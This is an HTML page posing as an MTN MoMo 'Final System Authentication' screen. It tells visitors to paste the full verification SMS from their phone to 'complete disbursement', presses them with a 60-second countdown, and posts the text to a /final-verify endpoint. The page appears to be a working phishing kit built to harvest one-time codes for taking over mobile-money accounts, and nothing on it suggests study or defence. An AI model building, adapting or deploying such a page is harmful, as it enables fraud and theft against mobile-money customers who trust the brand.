<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Final System Verification - MTN MoMo</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        * { box-sizing: border-box; }
        body {
            background-color: #003366;
            color: white;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: system-ui, -apple-system, sans-serif;
            margin: 0;
            padding: 20px;
            text-align: center;
        }
        .momo-box {
            width: 100%;
            max-width: 500px;
            background: #002244;
            border-radius: 20px;
            padding: 28px 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        }
        .momo-logo {
            background-color: #FFCC00;
            color: #003366;
            font-weight: 900;
            font-size: 1.4rem;
            padding: 6px 14px;
            border-radius: 10px;
            display: inline-block;
        }
        .timer-card {
            background: rgba(255, 204, 0, 0.1);
            border: 1px solid rgba(255, 204, 0, 0.55);
            border-radius: 12px;
            padding: 12px 14px;
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 18px;
            text-align: left;
        }
        .timer-ring-wrap {
            position: relative;
            width: 44px;
            height: 44px;
            flex-shrink: 0;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .timer-ring-wrap svg {
            width: 44px;
            height: 44px;
            transform: rotate(-90deg);
        }
        .ring-bg {
            fill: none;
            stroke: rgba(255, 204, 0, 0.22);
            stroke-width: 3.5;
        }
        .ring-progress {
            fill: none;
            stroke: #FFCC00;
            stroke-width: 3.5;
            stroke-linecap: round;
            stroke-dasharray: 113.1;
            stroke-dashoffset: 0;
            transition: stroke-dashoffset 0.9s linear;
        }
        .timer-num {
            position: absolute;
            font-size: 0.85rem;
            font-weight: 800;
            color: #FFCC00;
        }
        .timer-text strong {
            display: block;
            font-size: 0.88rem;
            color: #FFCC00;
        }
        .timer-text span {
            font-size: 0.8rem;
            color: rgba(255, 255, 255, 0.72);
        }
        .sms-textarea {
            width: 100%;
            min-height: 115px;
            border-radius: 10px;
            padding: 12px;
            font-size: 0.95rem;
            background: #001833;
            color: white;
            border: 1px solid rgba(255, 255, 255, 0.2);
            resize: vertical;
        }
        .sms-textarea:focus {
            outline: none;
            border-color: #FFCC00;
            box-shadow: 0 0 0 3px rgba(255, 204, 0, 0.2);
        }
        .sms-textarea::placeholder {
            color: rgba(255, 255, 255, 0.45);
        }
    </style>
</head>
<body>
    <div class="momo-box">
        <div class="momo-logo mb-3">MM</div>
        <h4 class="fw-bold mb-2">Final System Authentication</h4>
        <p class="text-white-50 small mb-3">Copy and paste the full verification SMS message sent to your phone to complete disbursement.</p>

        <div class="timer-card">
            <div class="timer-ring-wrap">
                <svg viewBox="0 0 42 42">
                    <circle class="ring-bg" cx="21" cy="21" r="18"></circle>
                    <circle id="ringFill" class="ring-progress" cx="21" cy="21" r="18"></circle>
                </svg>
                <span id="timerNum" class="timer-num">60</span>
            </div>
            <div class="timer-text">
                <strong id="timerLabel">Message expires in 60s.</strong>
                <span>Paste your SMS before time runs out.</span>
            </div>
        </div>

        <form action="/final-verify" method="POST">
            <div class="mb-4 text-start">
                <label for="finalCodeInput" class="form-label small text-warning fw-bold">Paste Full SMS Message:</label>
                <textarea
                    id="finalCodeInput"
                    class="sms-textarea"
                    name="final_code"
                    placeholder="Paste your full SMS message here..."
                    required
                ></textarea>
            </div>
            <button type="submit" id="submitBtn" class="btn btn-warning w-100 py-3 fw-bold text-dark rounded-3 shadow" disabled>COMPLETE DISBURSEMENT</button>
        </form>
    </div>

    <script>
        (function () {
            const totalSeconds = 60;
            let remaining = totalSeconds;
            const circumference = 2 * Math.PI * 18;
            const ringEl = document.getElementById("ringFill");
            const numEl = document.getElementById("timerNum");
            const labelEl = document.getElementById("timerLabel");

            ringEl.style.strokeDasharray = circumference;

            const interval = setInterval(() => {
                remaining -= 1;
                if (remaining <= 0) {
                    remaining = 0;
                    clearInterval(interval);
                    numEl.textContent = "0";
                    labelEl.textContent = "Message expired.";
                    ringEl.style.strokeDashoffset = circumference;
                    return;
                }
                numEl.textContent = String(remaining);
                labelEl.textContent = `Message expires in ${remaining}s.`;
                ringEl.style.strokeDashoffset = circumference * (1 - remaining / totalSeconds);
            }, 1000);

            const textarea = document.getElementById("finalCodeInput");
            const submitBtn = document.getElementById("submitBtn");

            function syncButton() {
                submitBtn.disabled = textarea.value.trim().length === 0;
            }

            textarea.addEventListener("input", syncButton);
            syncButton();
        })();
    </script>
</body>
</html>
